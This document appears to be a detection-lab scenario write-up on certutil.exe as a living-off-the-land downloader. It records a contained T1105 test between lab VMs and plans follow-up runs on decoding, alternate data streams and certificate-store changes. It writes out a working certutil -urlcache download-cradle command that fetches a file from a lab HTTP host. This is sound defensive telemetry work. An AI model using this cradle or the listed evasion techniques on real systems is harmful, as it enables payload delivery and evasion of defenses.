# Certutil remote-download scenarios

`certutil.exe` is a Microsoft-signed Windows certificate utility. Its presence
and signature make it an attractive living-off-the-land binary when an
operator wants to transfer a payload without first introducing a dedicated
downloader. Allowing signed system binaries by name alone does not distinguish
the normal certificate-management role from an HTTP download cradle.

## Verified flow: staged payload transfer

This verification exercised **Ingress Tool Transfer (T1105)** as a contained,
end-to-end operator flow:

1. Kali VM 100 staged a 3,768-byte, non-executable text fixture named
   `benign-stage.bin` on an HTTP server bound only to the lab interface at
   `192.168.1.50:18080`.
2. Windows VM 104 started from `win_verify_baseline` and captured full packets
   with `pktmon --pkt-size 0`.
3. From `C:\lab`, the SYSTEM account invoked:

   ```text
   certutil.exe -urlcache -split -f http://192.168.1.50:18080/benign-stage.bin C:\lab\downloaded.bin
   ```

4. The command exited successfully. The served and downloaded files both had
   SHA-256 `92EE1BBE6EE3B6CC7CD6ED720B594C6C3394D362838DB8C02C6CA6732E94F86A`.
5. Endpoint telemetry, the packet capture, and offline Zeek/Suricata output
   were collected before the web server was removed and the Windows VM was
   rolled back.

The flow used an IP literal and did not exercise DNS. It did exercise process,
parent-child, endpoint network, file, registry, and full-packet HTTP visibility.

## Future certutil techniques

These behaviors should be isolated into separate verification runs so their
telemetry and false-positive profiles are not conflated with the download
cradle:

- **Base64 and hexadecimal decode — T1140:** exercise `-decode` and
  `-decodehex` against benign encoded fixtures, then correlate the decoded file
  with any child execution in a separate, bounded run.
- **Encode and encodehex — T1027.013:** exercise `-encode` and `-encodehex` as
  file-content encoding. Encoding can stage data before a later exfiltration
  action, but the encoding operation alone is not proof of exfiltration.
- **Alternate data stream download — T1105 and T1564.004:** use `-urlcache -f`
  with an ADS destination and measure whether endpoint file telemetry preserves
  the stream name.
- **Cache-only URL retrieval — T1105:** compare `-URL` and `-urlcache` forms,
  including the cache metadata and content locations for user and service
  accounts.
- **Certificate-store operations:** verify `-addstore`, `-delstore`, and related
  trust-store manipulation separately. Installing a root certificate can map
  to T1553.004; deletion and other store changes need mapping based on the
  operator objective and observed impact.

The scenario design follows the LOLBAS Certutil entry and the ATT&CK definitions
for [T1105](https://attack.mitre.org/techniques/T1105/) and
[T1140](https://attack.mitre.org/techniques/T1140/).
